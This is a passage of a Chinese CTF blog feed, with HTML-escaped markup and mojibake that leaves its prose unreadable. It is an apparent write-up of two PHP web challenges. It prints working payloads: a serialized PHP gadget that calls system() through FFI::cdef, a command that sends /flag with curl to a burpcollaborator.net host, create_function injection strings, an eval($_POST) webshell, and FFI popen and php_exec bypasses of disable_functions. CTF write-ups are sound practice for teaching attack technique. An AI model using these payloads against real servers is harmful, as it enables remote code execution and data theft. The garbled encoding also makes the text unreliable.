&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__serialize&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__set&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æžœç†Ÿè¯»ä»¥ä¸Šä¸‰ä¸ªæ–‡æ¡£ï¼Œè¿™ä¸ªé¢˜å°±å¾ˆå¥½å‡ºäº†&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æŠŠfuncè®¾ä¸º&lt;code>FFI:cdef&lt;/code>ï¼Œargè®¾ä¸º&lt;code>int system(char *command)&lt;/code>æ¥æ‰§è¡Œcä»£ç ç»•è¿‡php.iniä¸­çš„é™åˆ¶ï¼›åŒæ—¶ç”±äºŽSerializableçš„ç§ç§æ–°ç‰¹æ€§ï¼ˆå‡ºé¢˜äººä¹Ÿåœ¨è¿™é‡Œè®¾äº†å‘ï¼‰ï¼Œæˆ‘ä»¬åœ¨æž„é€ pocæ—¶è¦åˆ é™¤&lt;code>__serialize()&lt;/code>ï¼Œé˜²æ­¢ç›´æŽ¥returnè¿›å‘é‡Œäº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;FFI::cdef&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;int system(char *command);&amp;#39;&lt;/span>
&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__set&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;start&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>éšåŽåœ¨ä¼ å…¥çš„åœ°æ–¹æ‰§è¡Œ&lt;code>unserialize(base64_decode(payload))-&amp;gt;__serialize()['ret']-&amp;gt;system(command);&lt;/code>ï¼Œç›´æŽ¥curlå¤–å¸¦flag&lt;/p>
&lt;pre tabindex="0">&lt;code>?a=unserialize(base64_decode(QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319))-&amp;gt;__serialize()['ret']-&amp;gt;system(&amp;quot;curl -d @/flag http://fm56ifsleqz363dh864mlhvtzk5atz.burpcollaborator.net&amp;quot;);
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223140032.png" alt="image-20211202223140032">&lt;/p>
&lt;p>â€”â€”â€”â€”åœ¨è¿™ä¸ªé¢˜å‡ºçŽ°ä¹‹åŽèšå‰‘è¿˜ä¸“é—¨å‡ºäº†å¯¹åº”çš„æ’ä»¶&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223257130.png" alt="image-20211202223257130">&lt;/p>
&lt;p>ä½†æ˜¯å¤šæ¬¡å°è¯•å¤±è´¥ï¼Œä¹‹åŽçœ‹åˆ°äº†è¿™ä¸ª&lt;a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">wp&lt;/a>ä¹‹åŽå†çœ‹&lt;a href="https://wiki.php.net/rfc/ffi">å®˜æ–¹æ–‡æ¡£&lt;/a>è¿˜æœ‰&lt;a href="https://www.laruence.com/2020/03/11/5475.html">è¿™ä¸€ç¯‡&lt;/a>å°±æ˜Žç™½äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223422195.png" alt="image-20211202223422195">&lt;/p>
&lt;p>é»˜è®¤æƒ…å†µä¸‹FFIåªä¼šè¢«ç”¨äºŽCLIæ¨¡å¼ä¸‹&amp;amp;é¢„åŠ è½½phpè„šæœ¬ï¼Œé™¤éžè®¾ç½®&lt;code>ffi.enable=true&lt;/code>ï¼Œè®¾ç½®ä¹‹åŽåœ¨webshellå°±å¯ä»¥ç›´æŽ¥ç”¨èšå‰‘æ’ä»¶äº†&lt;/p>
&lt;h3 id="æžå®¢å¤§æŒ‘æˆ˜-2020roamphp5-fighterfightsinvincibly">[æžå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp5-FighterFightsInvincibly&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173057497.png" alt="image-20211204173057497">&lt;/p>
&lt;p>å¾ˆæ¼‚äº®çš„å‰ç«¯ï¼Œçœ‹é¡µé¢æºç æœ‰æ³¨é‡Šçš„æç¤º&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173130852.png" alt="image-20211204173130852">&lt;/p>
&lt;p>è¿™ä¸ªå½¢å¼ï¼ŒçœŸçš„æ˜¯ä¸€çœ¼&lt;code>create_function()&lt;/code>äº†ï¼Œçœ‹ä¸€ä¸‹phpinfo()ï¼Œç”¨çš„è¿˜æ˜¯&lt;code>create_function()&lt;/code>çš„æ³¨å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}phpinfo();/*
&lt;/code>&lt;/pre>&lt;p>çœ‹ä¸‹disable_function&lt;/p>
&lt;pre tabindex="0">&lt;code>system,exec,shell_exec,passthru,proc_open,proc_close,&amp;amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;amp;nbsp;socket_connect,&amp;amp;nbsp;stream_socket_server,&amp;amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;amp;nbsp;posix_getrlimit,&amp;amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname&amp;lt;/td&amp;gt;&amp;lt;td class=&amp;quot;v&amp;quot;&amp;gt;system,exec,shell_exec,passthru,proc_open,proc_close,&amp;amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;amp;nbsp;socket_connect,&amp;amp;nbsp;stream_socket_server,&amp;amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;amp;nbsp;posix_getrlimit,&amp;amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
&lt;/code>&lt;/pre>&lt;p>ç›´æŽ¥ä¸ç”¨çœ‹äº†ï¼Œæœ‰ä¸€å¨ï¼Œè‚¯å®šå¾—ç»•è¿‡ï¼›èšå‰‘çš„å„ç§æ’ä»¶éƒ½å¤±è´¥ï¼Œå¾—æ‰‹åŠ¨ç»•ï¼Œffiæ‰©å±•å¼€ç€&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204174245283.png" alt="image-20211204174245283">&lt;/p>
&lt;p>çœ‹åˆ°è¿™é‡Œ&lt;code>ffi.enable=On&lt;/code>ï¼Œç¬¦åˆèšå‰‘æ’ä»¶çš„åº”ç”¨æ¡ä»¶ï¼Œå†™ä¸ªwebshellè¯•è¯•&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}eval($_POST[wuhu]);/*
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204175626714.png" alt="image-20211204175626714">&lt;/p>
&lt;p>what&amp;rsquo;s upï¼Œç«Ÿç„¶æ²¡æœ‰å›žæ˜¾&lt;/p>
&lt;p>å°è¯•pingï¼Œå‘çŽ°è¿˜ä¸å‡ºç½‘ï¼Œä¸èƒ½ç”¨curlå¤–å¸¦flag&lt;/p>
&lt;p>é‚£åªèƒ½ä»ŽFFIæœ¬èº«ä¸‹æ‰‹äº†ï¼Œè°ƒç”¨cçš„popen ç”¨ç®¡é“è¯»å‘½ä»¤æ‰§è¡Œçš„ç»“æžœ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#111">FILE&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>popen&lt;/code>ä¼šè°ƒç”¨&lt;code>fork()&lt;/code>äº§ç”Ÿå­è¿›ç¨‹ï¼Œç„¶åŽä»Žå­è¿›ç¨‹ä¸­è°ƒç”¨&lt;code>/bin/sh -c&lt;/code>æ¥æ‰§è¡Œå‚æ•°çš„å‘½ä»¤ï¼Œtypeæœ‰r(read)å’Œw(write)ï¼Œä¾ç…§è¿™ä¸ªå€¼&lt;code>popen&lt;/code>ä¼šå»ºç«‹ç®¡é“è¿žæŽ¥åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºè®¾å¤‡æˆ–å†™å…¥åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥è®¾å¤‡ä¸­&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}$ffi = FFI::cdef(&amp;quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&amp;quot;,&amp;quot;libc.so.6&amp;quot;);$o = $ffi-&amp;gt;popen(&amp;quot;ls / -lah&amp;quot;,&amp;quot;r&amp;quot;);$d = &amp;quot;&amp;quot;;while(($c = $ffi-&amp;gt;fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,&amp;quot;0&amp;quot;,0);}$ffi-&amp;gt;pclose($o);echo hex2bin($d);/*
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204180626497.png" alt="image-20211204180626497">&lt;/p>
&lt;p>å¦ä¸€ç§æ–¹æ³•æ˜¯è°ƒç”¨phpæºç ä¸­çš„å‡½æ•°&lt;code>php_exec()&lt;/code>ï¼Œå½“å®ƒçš„å‚æ•°typeä¸º3æ—¶å¯¹åº”è°ƒç”¨çš„æ˜¯&lt;code>passthru()&lt;/code>å‡½æ•°ï¼Œå…¶æ‰§è¡Œå‘½ä»¤å¯ä»¥å°†ç»“æžœåŽŸå§‹è¾“å‡º&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}$ffi = FFI::cdef(&amp;quot;int php_exec(int type, char *cmd);&amp;quot;);$ffi-&amp;gt;php_exec(3,&amp;quot;ls /&amp;quot;);/*
&lt;/code>&lt;/pre>&lt;p>ä½†æ˜¯ï¼Œè¿™é“é¢˜åœ¨buuå¤çŽ°ä¸äº†ï¼ŒåŽŸå› æ˜¯uuidæœ‰32ä¸ªå­—ç¬¦ï¼ŒåŠ ä¸Šè¿žå­—ç¬¦æœ‰36ä½ï¼Œå†åŠ ä¸Šflag{}æœ‰42ä½ï¼Œä½†æ˜¯/readflagç¨‹åºåªå…è®¸è¯»å‡º37ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æœ€åŽçš„5ä½æ˜¯è¯»ä¸å‡ºæ¥çš„ï¼ˆè¾£ä¸ªå”¯ä¸€è§£å¯èƒ½æ˜¯çˆ†ç ´çš„ æˆ‘è¯•ç€çˆ†äº†ä¸€ä¼š åŠ å»¶æ—¶å¾—è·‘å¥½ä¹…å¥½ä¹…å¥½ä¹… æ”¾å¼ƒäº†&lt;/p>
&lt;hr>
&lt;p>æœ€è¿‘åœ¨åˆ·buuojï¼Œæœ‰æœ›è¿™ä¸ªæœˆå†…æŠŠ50è§£ä»¥ä¸Šçš„é¢˜åšå®Œæ&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æŽ¥ðŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://wiki.php.net/rfc/preload">PHP RFC: Preloading&lt;/a> | &lt;a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface&lt;/a> | &lt;a href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism&lt;/a> | &lt;a href="https://www.laruence.com/2020/03/11/5475.html">PHP FFIè¯¦è§£ - ä¸€ç§å…¨æ–°çš„PHPæ‰©å±•æ–¹å¼&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://towardsdatascience.com/do-you-hate-how-slow-python-is-this-is-how-you-can-make-it-run-faster-532468fe1583">Do You Hate How Slow Python Is? This Is How You Can Make It Run Faster!&lt;/a> | &lt;a href="https://towardsdatascience.com/make-python-faster-with-cffi-python-bindings-eb5402bc35dd">Make Python Faster with CFFI Python Bindings&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://cffi.readthedocs.io/en/latest/">CFFI documentation&lt;/a> | &lt;a href="https://docs.python.org/3/library/ctypes.html">ctypes documentation&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/ccxikka/p/9637545.html">Python cffiå­¦ä¹  &lt;/a> | &lt;a href="https://github.com/wolever/python-cffi-example">cffi-example: an example project showing how to use Python&amp;rsquo;s CFFI&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">wp&lt;/a> | &lt;a href="http://www.lshhaisheng.com/2021/08/02/%E7%BB%95%E8%BF%87disable_function/">wp2&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>PHP_Sessionå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/11/29/php-session-study-notes/</link><pubDate>Mon, 29 Nov 2021 22:23:42 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/29/php-session-study-notes/</guid><description>&lt;p>æåˆ°sessionï¼Œèƒ½æƒ³åˆ°ä»€ä¹ˆæï¼Ÿæ–‡ä»¶ä¸Šä¼ ï¼Œæ¡ä»¶ç«žäº‰ï¼ŒsessionåŒ…å«ï¼Œååºåˆ—åŒ–â€¦â€¦ è®©æˆ‘ä»¬ä¸€ç‚¹ç‚¹è¯´&lt;/p>
